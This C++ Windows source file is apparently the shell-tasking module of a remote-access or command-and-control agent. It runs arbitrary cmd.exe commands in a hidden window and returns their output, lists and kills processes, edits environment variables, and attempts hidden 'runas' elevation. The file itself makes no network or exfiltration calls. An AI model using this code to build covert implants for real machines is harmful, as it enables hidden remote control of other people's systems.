#include "shell_tasks.h"
#include "../core/config.h"
#include "../utils/system_info.h"

#include <windows.h>
#include <direct.h>
#include <tlhelp32.h>
#include <sstream>
#include <iomanip>
#include <iostream>
#include <vector>

namespace Tasks {
namespace Shell {

    // Helper function to convert string to wide string
    static std::wstring StringToWString(const std::string& s) {
        int len = MultiByteToWideChar(CP_ACP, 0, s.c_str(), -1, NULL, 0);
        std::wstring ws(len, L'\0');
        MultiByteToWideChar(CP_ACP, 0, s.c_str(), -1, &ws[0], len);
        if (!ws.empty() && ws.back() == L'\0')
            ws.pop_back();
        return ws;
    }

    std::string ExecuteCommand(const std::string& command, DWORD timeoutMs) {
        if (command.empty()) {
            return "Error: Empty command provided";
        }

        HANDLE hStdInPipeRead = NULL;
        HANDLE hStdInPipeWrite = NULL;
        HANDLE hStdOutPipeRead = NULL;
        HANDLE hStdOutPipeWrite = NULL;
        SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };

        // Create pipes for STDIN and STDOUT
        if (!CreatePipe(&hStdInPipeRead, &hStdInPipeWrite, &sa, 0)) {
            PRINTF("[DEBUG] Error: Failed to create STDIN pipe. Error: %d\n", GetLastError());
            return "Error: Failed to create STDIN pipe.";
        }
        
        if (!CreatePipe(&hStdOutPipeRead, &hStdOutPipeWrite, &sa, 0)) {
            PRINTF("[DEBUG] Error: Failed to create STDOUT pipe. Error: %d\n", GetLastError());
            CloseHandle(hStdInPipeRead);
            CloseHandle(hStdInPipeWrite);
            return "Error: Failed to create STDOUT pipe.";
        }

        // Set up STARTUPINFO to redirect handles and hide the window
        STARTUPINFOW si = { 0 };
        si.cb = sizeof(STARTUPINFO);
        si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
        si.wShowWindow = SW_HIDE;
        si.hStdError = hStdOutPipeWrite;
        si.hStdOutput = hStdOutPipeWrite;
        si.hStdInput = hStdInPipeRead;

        PROCESS_INFORMATION pi = { 0 };
        std::wstring wCommandLine = L"cmd.exe /c " + StringToWString(command);
        
        PRINTF("[DEBUG] Executing command: %s\n", command.c_str());
        PRINTF("[DEBUG] Full command line: %ls\n", wCommandLine.c_str());

        if (!CreateProcessW(NULL, (LPWSTR)wCommandLine.c_str(), NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
            PRINTF("[DEBUG] Error: Failed to create process. Error: %d\n", GetLastError());
            CloseHandle(hStdInPipeRead);
            CloseHandle(hStdInPipeWrite);
            CloseHandle(hStdOutPipeRead);
            CloseHandle(hStdOutPipeWrite);
            return "Error: Failed to create process.";
        }

        // Wait for the process to finish with timeout
        if (WaitForSingleObject(pi.hProcess, timeoutMs) == WAIT_TIMEOUT) {
            PRINTF("[DEBUG] Process timed out after %d ms\n", timeoutMs);
            TerminateProcess(pi.hProcess, 0);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            CloseHandle(hStdOutPipeWrite);
            CloseHandle(hStdInPipeRead);
            CloseHandle(hStdInPipeWrite);
            CloseHandle(hStdOutPipeRead);
            return "Error: Process timed out.";
        }

        // Close unneeded pipe handles
        CloseHandle(hStdOutPipeWrite);
        CloseHandle(hStdInPipeRead);

        // Read the output from the STDOUT pipe
        std::string output;
        const DWORD BUFSIZE = 1024;
        char buffer[BUFSIZE + 1] = { 0 };
        DWORD dwRead = 0;
        
        while (ReadFile(hStdOutPipeRead, buffer, BUFSIZE, &dwRead, NULL) && dwRead > 0) {
            buffer[dwRead] = '\0';
            output.append(buffer);
        }

        // Clean up all handles
        CloseHandle(hStdOutPipeRead);
        CloseHandle(hStdInPipeWrite);
        
        DWORD dwExitCode = 0;
        GetExitCodeProcess(pi.hProcess, &dwExitCode);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);

        // Clear sensitive data
        SecureZeroMemory(buffer, sizeof(buffer));

        PRINTF("[DEBUG] Command completed with exit code: %d\n", dwExitCode);
        return output;
    }

    std::string GetCurrentDirectory() {
        char buffer[MAX_PATH];
        if (_getcwd(buffer, MAX_PATH)) {
            std::string result(buffer);
            PRINTF("[DEBUG] Current directory: %s\n", result.c_str());
            return result;
        }
        else {
            DWORD error = GetLastError();
            PRINTF("[DEBUG] _getcwd failed with error: %d\n", error);
            return "Error: Failed to get current directory (Error: " + std::to_string(error) + ")";
        }
    }

    std::string ChangeDirectory(const std::string& path) {
        if (path.empty()) {
            return "Error: No directory path provided";
        }

        if (SetCurrentDirectoryA(path.c_str())) {
            PRINTF("[DEBUG] Changed directory to: %s\n", path.c_str());
            return "Changed directory to " + path;
        }
        else {
            DWORD error = GetLastError();
            PRINTF("[DEBUG] SetCurrentDirectoryA failed with error: %d\n", error);
            return "Failed to change directory to " + path + " (Error: " + std::to_string(error) + ")";
        }
    }

    std::string GetCurrentUser() {
        return Utils::SystemInfo::GetUsername();
    }

    std::string GetProcessList() {
        std::stringstream ss;
        ss << std::setw(8) << "PID" << " " << std::setw(8) << "Parent" << " "
           << std::setw(6) << "Arch" << " " << std::setw(18) << "User" << " " << "Process Name" << "\n";
        ss << "-------------------------------------------------------------\n";

        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnapshot == INVALID_HANDLE_VALUE) {
            PRINTF("[DEBUG] Failed to create process snapshot: %d\n", GetLastError());
            return "Error: Failed to create process snapshot";
        }

        PROCESSENTRY32 pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32);
        if (!Process32First(hSnapshot, &pe32)) {
            DWORD error = GetLastError();
            CloseHandle(hSnapshot);
            PRINTF("[DEBUG] Process32First failed: %d\n", error);
            return "Error: Failed to retrieve first process";
        }

        int processCount = 0;
        do {
            DWORD pid = pe32.th32ProcessID;
            DWORD ppid = pe32.th32ParentProcessID;
            std::string procName = pe32.szExeFile;
            std::string arch = GetProcessArchitecture(pid);
            std::string user = ""; // TODO: Implement user lookup if needed

            ss << std::setw(8) << pid << " " << std::setw(8) << ppid << " " << std::setw(6) << arch << " "
               << std::setw(18) << user << " " << procName << "\n";
            processCount++;
        } while (Process32Next(hSnapshot, &pe32));

        CloseHandle(hSnapshot);
        
        ss << "\nTotal processes: " << processCount;
        PRINTF("[DEBUG] Listed %d processes\n", processCount);
        return ss.str();
    }

    std::string GetProcessInfo(DWORD pid) {
        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnapshot == INVALID_HANDLE_VALUE) {
            return "Error: Failed to create process snapshot";
        }

        PROCESSENTRY32 pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32);
        if (!Process32First(hSnapshot, &pe32)) {
            CloseHandle(hSnapshot);
            return "Error: Failed to retrieve process information";
        }

        do {
            if (pe32.th32ProcessID == pid) {
                CloseHandle(hSnapshot);
                
                std::stringstream ss;
                ss << "Process ID: " << pe32.th32ProcessID << "\n";
                ss << "Parent PID: " << pe32.th32ParentProcessID << "\n";
                ss << "Process Name: " << pe32.szExeFile << "\n";
                ss << "Thread Count: " << pe32.cntThreads << "\n";
                ss << "Architecture: " << GetProcessArchitecture(pid) << "\n";
                
                return ss.str();
            }
        } while (Process32Next(hSnapshot, &pe32));

        CloseHandle(hSnapshot);
        return "Error: Process with PID " + std::to_string(pid) + " not found";
    }

    bool ProcessExists(DWORD pid) {
        HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
        if (hProcess != NULL) {
            CloseHandle(hProcess);
            return true;
        }
        return false;
    }

    std::string GetProcessArchitecture(DWORD pid) {
        if (pid == 0) return "N/A"; // System Idle Process

        HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
        if (hProcess == NULL) {
            return "N/A";
        }

        BOOL isWow64 = FALSE;
        typedef BOOL(WINAPI *LPFN_ISWOW64PROCESS)(HANDLE, PBOOL);
        LPFN_ISWOW64PROCESS fnIsWow64Process = (LPFN_ISWOW64PROCESS)GetProcAddress(
            GetModuleHandleA("kernel32"), "IsWow64Process");
        
        std::string arch = "N/A";
        if (fnIsWow64Process) {
            if (fnIsWow64Process(hProcess, &isWow64)) {
                arch = isWow64 ? "x86" : "x64";
            }
        }
        
        CloseHandle(hProcess);
        return arch;
    }

    bool KillProcess(DWORD pid) {
        if (pid == 0 || pid == 4) { // Don't kill System Idle or System process
            PRINTF("[DEBUG] Refusing to kill system process PID %d\n", pid);
            return false;
        }

        HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
        if (hProcess == NULL) {
            PRINTF("[DEBUG] Failed to open process %d for termination: %d\n", pid, GetLastError());
            return false;
        }

        BOOL result = TerminateProcess(hProcess, 1);
        DWORD error = GetLastError();
        CloseHandle(hProcess);

        if (result) {
            PRINTF("[DEBUG] Successfully terminated process %d\n", pid);
            return true;
        }
        else {
            PRINTF("[DEBUG] Failed to terminate process %d: %d\n", pid, error);
            return false;
        }
    }

    std::string GetEnvironmentVariable(const std::string& varName) {
        if (varName.empty()) {
            return "";
        }

        DWORD bufferSize = ::GetEnvironmentVariableA(varName.c_str(), NULL, 0);
        if (bufferSize == 0) {
            return ""; // Variable not found
        }

        std::vector<char> buffer(bufferSize);
        DWORD result = ::GetEnvironmentVariableA(varName.c_str(), buffer.data(), bufferSize);
        
        if (result == 0 || result >= bufferSize) {
            return "";
        }

        return std::string(buffer.data());
    }

    bool SetEnvironmentVariable(const std::string& varName, const std::string& value) {
        if (varName.empty()) {
            return false;
        }

        BOOL result = SetEnvironmentVariableA(varName.c_str(), value.empty() ? NULL : value.c_str());
        if (result) {
            PRINTF("[DEBUG] Set environment variable %s = %s\n", varName.c_str(), value.c_str());
        }
        else {
            PRINTF("[DEBUG] Failed to set environment variable %s: %d\n", varName.c_str(), GetLastError());
        }
        
        return result != FALSE;
    }

    std::string ExecuteElevatedCommand(const std::string& command) {
        // First check if we're already elevated
        if (IsRunningAsAdmin()) {
            return ExecuteCommand(command);
        }

        // If not elevated, try to execute with elevated privileges
        SHELLEXECUTEINFOA sei = { sizeof(sei) };
        sei.lpVerb = "runas";
        sei.lpFile = "cmd.exe";
        std::string params = "/c " + command;
        sei.lpParameters = params.c_str();
        sei.hwnd = NULL;
        sei.nShow = SW_HIDE;
        sei.fMask = SEE_MASK_NOCLOSEPROCESS;

        if (ShellExecuteExA(&sei)) {
            if (sei.hProcess != NULL) {
                WaitForSingleObject(sei.hProcess, 10000);
                CloseHandle(sei.hProcess);
                return "Command executed with elevated privileges (output not captured)";
            }
        }

        return "Error: Failed to execute command with elevated privileges";
    }

    std::string GetSystemPath() {
        return GetEnvironmentVariable("PATH");
    }

    bool IsRunningAsAdmin() {
        return Utils::SystemInfo::GetIntegrity() == 4; // 4 = High integrity (Admin)
    }

} // namespace Shell
} // namespace Tasks